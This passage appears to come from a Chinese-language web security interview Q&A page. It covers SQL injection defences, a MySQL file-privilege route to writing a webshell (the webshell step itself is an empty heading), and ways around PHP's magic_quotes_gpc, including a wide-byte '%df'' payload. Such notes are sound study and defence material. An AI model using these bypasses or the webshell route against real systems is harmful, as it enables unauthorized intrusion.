<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">输入验证</span></strong></span><span class="md-plain">：严格限制输入格式（如数字型参数只允许</span><span class="md-pair-s" spellcheck="false"><code>0-9</code></span><span class="md-plain">，字符串型用白名单过滤）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">最小权限原则</span></strong></span><span class="md-plain">：数据库用户仅赋予必要权限（如</span><span class="md-pair-s" spellcheck="false"><code>SELECT</code></span><span class="md-plain">），禁用</span><span class="md-pair-s" spellcheck="false"><code>FILE</code></span><span class="md-plain">权限和</span><span class="md-pair-s" spellcheck="false"><code>xp_cmdshell</code></span><span class="md-plain">；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">错误信息屏蔽</span></strong></span><span class="md-plain">：生产环境关闭详细错误提示（如 PHP 的</span><span class="md-pair-s" spellcheck="false"><code>display_errors=Off</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">WAF 部署</span></strong></span><span class="md-plain">：使用 Web 应用防火墙拦截常见注入特征；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">定期审计</span></strong></span><span class="md-plain">：通过工具（如 SQLMap）扫描漏洞，修复代码缺陷。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">35. MySQL 文件上传利用步骤</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">1. 确认数据库权限与配置</span></h4>
<ul class="ul-list" data-mark="-">

<p class="md-end-block md-p"><span class="md-plain">检查当前用户权限</span></p>

SHOW GRANTS;  -- 需返回包含 FILE 权限（如 "FILE ON . TO 'root'@'localhost'"）

<h4 class="md-end-block md-heading"><span class="md-plain">2. 写入 Webshell 文件</span></h4>

<h3 class="md-end-block md-heading"><span class="md-plain">36. GPC 是什么？GPC 之后怎么绕过？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">GPC</span></strong></span><span class="md-plain">：即</span><span class="md-pair-s" spellcheck="false"><code>magic_quotes_gpc</code></span><span class="md-plain">，是 PHP 的配置项（PHP 5.4 后移除），作用是自动对 GET、POST、COOKIE 中的特殊字符（单引号</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">、双引号</span><span class="md-pair-s" spellcheck="false"><code>&quot;</code></span><span class="md-plain">、反斜杠</span><span class="md-pair-s" spellcheck="false"><code>\</code></span><span class="md-plain">等）添加反斜杠</span><span class="md-pair-s" spellcheck="false"><code>\</code></span><span class="md-plain">转义，试图防止 SQL 注入。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">绕过方法</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">宽字节注入</span></strong></span><span class="md-plain">：若目标使用 GBK 编码，输入</span><span class="md-pair-s" spellcheck="false"><code>%df&#039;</code></span><span class="md-plain">（单引号），GPC 会转义为</span><span class="md-pair-s" spellcheck="false"><code>%df\&#039;</code></span><span class="md-plain">，但</span><span class="md-pair-s" spellcheck="false"><code>%df\</code></span><span class="md-plain">在 GBK 中是一个宽字节，导致单引号</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">逃逸，形成有效注入。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">编码绕过</span></strong></span><span class="md-plain">：对特殊字符 URL 编码（如</span><span class="md-pair-s" spellcheck="false"><code>&#039;</code></span><span class="md-plain">编码为</span><span class="md-pair-s" spellcheck="false"><code>%27</code></span><span class="md-plain">），部分场景下 GPC 不处理编码后的字符。</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">利用未过滤参数</span></strong></span><span class="md-plain">：GPC 不处理</span><span class="md-pair-s" spellcheck="false"><code>$_SERVER[&#039;REQUEST_URI&#039;]</code></span><span class="md-plain md-expand">等参数，可尝试从 URL 路径注入。</span></p>
</li>
</ul>
</li>
</ul>
